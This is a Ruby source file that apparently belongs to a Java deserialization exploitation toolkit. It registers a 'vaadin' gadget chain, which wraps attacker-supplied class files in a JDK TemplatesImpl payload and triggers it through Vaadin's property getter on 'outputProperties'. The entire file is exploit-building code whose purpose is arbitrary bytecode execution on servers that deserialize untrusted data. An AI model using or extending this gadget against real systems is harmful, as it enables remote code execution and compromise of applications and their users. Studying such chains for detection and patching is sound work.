

require_relative '../payloads/vaadin'
require_relative '../payloads/templates'

class Vaadin < Java::Gadgets::Gadget
  def id
    'vaadin'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('vaadin')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    ['bytecode']
  end

  def create(ctx, params: {})
    ctx.reg.load('model/vaadin.json')

    if !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::Vaadin.make_get_property(tpl, 'outputProperties')
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Vaadin.new
)
